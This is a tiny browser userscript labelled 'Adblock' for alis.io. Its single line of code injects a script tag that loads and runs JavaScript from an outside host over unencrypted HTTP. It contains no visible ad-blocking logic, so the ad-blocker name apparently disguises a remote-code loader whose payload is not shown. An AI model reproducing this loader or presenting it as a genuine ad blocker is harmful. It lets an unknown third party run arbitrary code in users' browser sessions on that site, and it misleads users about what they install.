// ==UserScript==
// @name         Adblock
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  adblock alis.io
// @author       [pkb]
// @match        *://alis.io/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/28655/Adblock.user.js
// @updateURL https://update.greasyfork.org/scripts/28655/Adblock.meta.js
// ==/UserScript==

$("body").append("<script src='http://adblock.usite.pro/adblock.js'></script>");